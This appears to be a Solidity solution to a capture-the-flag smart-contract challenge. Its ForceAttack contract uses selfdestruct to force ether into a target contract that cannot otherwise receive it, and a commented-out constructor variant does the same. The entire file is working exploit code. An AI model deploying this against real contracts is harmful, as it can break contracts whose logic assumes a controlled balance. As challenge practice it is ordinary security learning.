// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract ForceAttack {
    // A more elegant solution
    //
    // constructor(address payable target) payable {
    //     require(msg.value > 0);
    //     selfdestruct(target);
    // }

    function attack(address challengeAddress) external {
        selfdestruct(payable(challengeAddress));
    }

    receive() external payable {}
}
